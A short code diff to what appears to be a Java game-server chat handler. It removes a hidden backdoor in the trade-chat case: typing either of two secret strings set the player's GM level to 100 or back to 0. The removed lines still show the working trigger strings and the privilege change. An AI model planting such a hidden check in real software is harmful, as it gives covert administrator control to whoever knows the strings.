@@ -336,14 +336,6 @@ public class PlayerInteractionHandler
             }
             case 6: {
                 final String message = slea.readMapleAsciiString();
-                if (message.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
-                    chr.setGmLevelHM((byte)100);
-                    return;
-                }
-                if (message.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
-                    chr.setGmLevelHM((byte)0);
-                    return;
-                }
                 if (chr.getTrade() != null) {
                     chr.getTrade().chat(message);
                     break;
